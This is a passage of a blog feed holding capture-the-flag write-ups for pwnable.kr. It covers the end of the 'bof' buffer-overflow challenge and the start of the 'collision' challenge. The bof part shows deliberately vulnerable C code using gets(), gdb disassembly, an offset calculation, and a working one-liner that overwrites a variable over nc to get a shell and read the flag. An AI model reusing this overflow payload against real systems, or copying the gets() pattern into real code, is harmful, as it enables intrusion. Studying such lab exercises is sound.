&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// smash me!
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nah..&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly, we can see that this application is vulnerable to overflow, since &lt;code class=&quot;highlighter-rouge&quot;&gt;gets()&lt;/code&gt; function won’t cut the characters after the buffer. Let’s see man pages.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Never use gets().  Because it is impossible to tell without knowing the
data  in  advance  how  many  characters  gets() will read, and because
gets() will continue to store characters past the end of the buffer, it
is  extremely  dangerous  to  use.   It has been used to break computer
security.  Use fgets() instead.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Since the best way to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; is to make the the comparision &lt;strong&gt;&lt;em&gt;true&lt;/em&gt;&lt;/strong&gt;, we will have to overflow the buffer, and change the value of the &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; parameter. Game plan is to find out the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, and then the address of
&lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt;. This will allow us to calculate the offset between those 2 addresses, resulting in the number of trash data that has to be put into the buffer.&lt;/p&gt;

&lt;p&gt;Let’s fire up &lt;strong&gt;&lt;em&gt;gdb&lt;/em&gt;&lt;/strong&gt;, and disassemble &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % gdb ./bof

&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
   0x0000068a &amp;lt;+0&amp;gt;:	push   %ebp
   0x0000068b &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x0000068d &amp;lt;+3&amp;gt;:	and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
   0x00000690 &amp;lt;+6&amp;gt;:	sub    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
   0x00000693 &amp;lt;+9&amp;gt;:	movl   &lt;span class=&quot;nv&quot;&gt;$0xdeadbeef&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   0x0000069a &amp;lt;+16&amp;gt;:	call   0x62c &amp;lt;func&amp;gt;
   0x0000069f &amp;lt;+21&amp;gt;:	mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
   0x000006a4 &amp;lt;+26&amp;gt;:	leave
   0x000006a5 &amp;lt;+27&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we can see that at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+9&lt;/code&gt; the &lt;strong&gt;&lt;em&gt;0xdeadbeef&lt;/em&gt;&lt;/strong&gt; is moved into the &lt;strong&gt;&lt;em&gt;esp&lt;/em&gt;&lt;/strong&gt;. In order to find the address of this variable we will have to set up breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+16&lt;/code&gt;, and view the content of &lt;strong&gt;&lt;em&gt;stack pointer&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;main+16
Breakpoint 1 at 0x69a
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
Starting program: /home/w3ndige/programming/pwnable.kr/bof

Breakpoint 1, 0x5655569a &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
0xffffd180:	0xdeadbeef&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have it! Now we have to find the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; buffer, which lays in the &lt;code class=&quot;highlighter-rouge&quot;&gt;func&lt;/code&gt; function. Let’s disassemble it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas func
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;func:
   0x0000062c &amp;lt;+0&amp;gt;:	push   ebp
   0x0000062d &amp;lt;+1&amp;gt;:	mov    ebp,esp
   0x0000062f &amp;lt;+3&amp;gt;:	sub    esp,0x48
   0x00000632 &amp;lt;+6&amp;gt;:	mov    eax,gs:0x14
   0x00000638 &amp;lt;+12&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0xc],eax
   0x0000063b &amp;lt;+15&amp;gt;:	xor    eax,eax
   0x0000063d &amp;lt;+17&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x78c
   0x00000644 &amp;lt;+24&amp;gt;:	call   0x645 &amp;lt;func+25&amp;gt;
   0x00000649 &amp;lt;+29&amp;gt;:	lea    eax,[ebp-0x2c]
   0x0000064c &amp;lt;+32&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
   0x0000064f &amp;lt;+35&amp;gt;:	call   0x650 &amp;lt;func+36&amp;gt;
   0x00000654 &amp;lt;+40&amp;gt;:	cmp    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8],0xcafebabe
   0x0000065b &amp;lt;+47&amp;gt;:	jne    0x66b &amp;lt;func+63&amp;gt;
   0x0000065d &amp;lt;+49&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x79b
   0x00000664 &amp;lt;+56&amp;gt;:	call   0x665 &amp;lt;func+57&amp;gt;
   0x00000669 &amp;lt;+61&amp;gt;:	jmp    0x677 &amp;lt;func+75&amp;gt;
   0x0000066b &amp;lt;+63&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x7a3
   0x00000672 &amp;lt;+70&amp;gt;:	call   0x673 &amp;lt;func+71&amp;gt;
   0x00000677 &amp;lt;+75&amp;gt;:	mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0xc]
   0x0000067a &amp;lt;+78&amp;gt;:	xor    eax,DWORD PTR gs:0x14
   0x00000681 &amp;lt;+85&amp;gt;:	je     0x688 &amp;lt;func+92&amp;gt;
   0x00000683 &amp;lt;+87&amp;gt;:	call   0x684 &amp;lt;func+88&amp;gt;
   0x00000688 &amp;lt;+92&amp;gt;:	leave
   0x00000689 &amp;lt;+93&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Since we know that local variables are on the negative size of &lt;strong&gt;&lt;em&gt;ebp&lt;/em&gt;&lt;/strong&gt; (&lt;a href=&quot;https://www.cs.virginia.edu/~evans/cs216/guides/x86.html&quot; title=&quot;read more&quot;&gt;read more&lt;/a&gt;), we can guess that &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x2c&lt;/code&gt; is the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; variable. Let’s set another breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; and find out if it’s true.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;gets
Breakpoint 2 at 0xf7e3b915
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
Continuing.
overflow me :

Breakpoint 2, 0xf7e3b915 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gets &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; from /usr/lib32/libc.so.6
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; next
Single stepping &lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;from &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;gets,
which has no line number information.
helloworld
0x56555654 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;func &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/1s &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-0x2c&lt;/span&gt;
0xffffd14c:	&lt;span class=&quot;s2&quot;&gt;&quot;helloworld&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to calculate the offset between those two addresses.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd180&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd14c&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ready to exploit?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print 52*'A'+'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ca'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | nc pwnable.kr 9000
whoami
bof
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 25060
drwxr-x---  3 root bof      4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 80 root root     4096 Jan 11  2017 ..
d---------  2 root root     4096 Jun 12  2014 .bash_history
&lt;span class=&quot;nt&quot;&gt;-r-xr-x---&lt;/span&gt;  1 root bof      7348 Sep 12  2016 bof
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root      308 Oct 23  2016 bof.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 root bof        32 Jun 11  2014 flag
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 25626087 Nov 23 11:33 log
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root        0 Oct 23  2016 log2
&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt;  1 root root      760 Sep 10  2014 super.pl
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag
daddy, I just pwned a buFFer :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By printing 52 &lt;strong&gt;&lt;em&gt;A&lt;/em&gt;&lt;/strong&gt; letters and the number used in comparision (stored in &lt;strong&gt;&lt;em&gt;little endian format&lt;/em&gt;&lt;/strong&gt;), we were able to exploit this application.&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-bof/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-bof/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - collision</title>
        <description>&lt;p&gt;Let’s start another challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;collision&lt;/em&gt;&lt;/strong&gt;, which is next one in &lt;strong&gt;&lt;em&gt;Toddler’s Bottle&lt;/em&gt;&lt;/strong&gt; category.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once again we have to connect via &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt; in order to view challenge files.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % ssh col@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
col@pwnable.krs password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
Last login: Fri Nov 24 12:21:39 2017 from 24.16.85.95
col@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
drwxr-x---  5 root    col     4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 80 root    root    4096 Jan 11  2017 ..
d---------  2 root    root    4096 Jun 12  2014 .bash_history
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 col_pwn col     7341 Jun 11  2014 col
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root    root     555 Jun 12  2014 col.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 col_pwn col_pwn   52 Jun 11  2014 flag
dr-xr-xr-x  2 root    root    4096 Aug 20  2014 .irssi
drwxr-xr-x  2 root    root    4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And without hesitation, let’s jump straight into the code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;usage : %s [passcode]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
